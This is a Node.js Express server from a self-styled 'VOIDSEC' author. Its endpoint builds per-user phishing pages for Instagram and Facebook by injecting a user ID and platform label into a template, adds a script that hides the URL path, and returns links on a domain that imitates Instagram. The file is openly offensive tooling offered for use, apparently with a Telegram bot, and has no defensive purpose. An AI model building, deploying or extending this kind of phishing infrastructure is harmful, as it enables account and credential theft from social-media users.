/*
 * © 2026 SeXyxeon (VOIDSEC)
 *
 * ⚠️ COPYRIGHT NOTICE
 * This source code is protected under copyright law.
 * Any form of re-uploading, recoding, modification,
 * selling, or redistribution WITHOUT explicit permission
 * from the original author is strictly prohibited.
 *
 * ❌ NO CREDIT = NO PERMISSION
 * ❌ DO NOT CLAIM THIS CODE AS YOUR OWN
 *
 * ✔️ Usage or modification is allowed ONLY
 * with prior permission and proper credit.
 *
 * OFFICIAL LINKS (ONLY):
 * YouTube   : https://youtube.com/@voidsec7718
 * Instagram : sabir._7718
 * Telegram  : https://t.me/SABIR7718
 * GitHub    : https://github.com/SABIR7718
 * WhatsApp  : +91 73650 85213
 *
 * Violations may result in DMCA takedown
 * or termination of the Telegram bot.
 */

const express = require('express');
const LOVE = require('fs');
const SY = require('cors');
const S7 = require('path');

const S7LOVESY = express();
const SYLOVE = 4000;
const SY_DIR = S7.join(__dirname, 'LOVE');
if (!LOVE.existsSync(SY_DIR)) {
    LOVE.mkdirSync(SY_DIR);
}
S7LOVESY.use(SY());
S7LOVESY.use(express.json());
S7LOVESY.use(express.static(SY_DIR));

function MyLoveSY(length) {
    const SYloves = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let Loving = '';
    for (let i = 0; i < length; i++) {
        Loving += SYloves.charAt(Math.floor(Math.random() * SYloves.length));
    }
    return Loving;
}

function LoveMeSY(plat) {
    if (!plat) return "UNKNOWN";
    const Love_SY_Ok = plat.toLowerCase();
    if (Love_SY_Ok === 'instagram') return "𝐈𝐍𝐒𝐓𝐀𝐆𝐑𝐀𝐌";
    if (Love_SY_Ok === 'facebook') return "𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊";
    return plat.toUpperCase();
}

S7LOVESY.get('/create-link', (req, res) => {
    const { userid, platform } = req.headers;

    if (!userid || !platform) {
        return res.status(400).json({ success: false, error: 'Missing headers' });
    }

    const SYloveMe = LoveMeSY(platform);
    const mainLovePathToSY = S7.join(__dirname, 'main.html');

    LOVE.readFile(mainLovePathToSY, 'utf8', (err, data) => {
        if (err) {
            console.error('\x1b[31m[ERROR]\x1b[0m main.html not found');
            return res.status(500).json({ success: false, error: 'Template missing' });
        }

        let LoveS7xSYDta = data.replace(/const id = ".*";/, `const id = "${userid}";`);
        LoveS7xSYDta = LoveS7xSYDta.replace(/const p = ".*";/, `const p = "${SYloveMe}";`);

        const S7xSY = '<script>if(window.history.replaceState){window.history.replaceState(null, "", "/");}</script>';
        LoveS7xSYDta += S7xSY;

        const LovesNameSY = MyLoveSY(4);
        const LovePathToSY = S7.join(SY_DIR, `${LovesNameSY}.html`);
        LOVE.writeFile(LovePathToSY, LoveS7xSYDta, (writeErr) => {
            if (writeErr) {
                console.error('\x1b[31m[ERROR]\x1b[0m Write failed');
                return res.status(500).json({ success: false, error: 'Write failed' });
            }
            console.log(`\x1b[32m[SUCCESS]\x1b[0m Created: ${LovesNameSY}.html | URL: /${LovesNameSY}`);

            res.json({
                success: true,
                url: `https://instagram-123.onrender.com/${LovesNameSY}`
            });
        });
    });
});
S7LOVESY.get('/:file', (req, res, next) => {
    const LovePathToSY = S7.join(SY_DIR, `${req.params.file}.html`);

    if (LOVE.existsSync(LovePathToSY)) {
        res.sendFile(LovePathToSY);
    } else {
        next();
    }
});
S7LOVESY.listen(SYLOVE, () => {
    console.log(`\x1b[36m[SYSTEM]\x1b[0m Server Active on Port ${SYLOVE}`);
    console.log(`\x1b[36m[SYSTEM]\x1b[0m Files Directory: ${SY_DIR}`);
    console.log(`\x1b[36m[SYSTEM]\x1b[0m Dev by @SABIR7718`);
});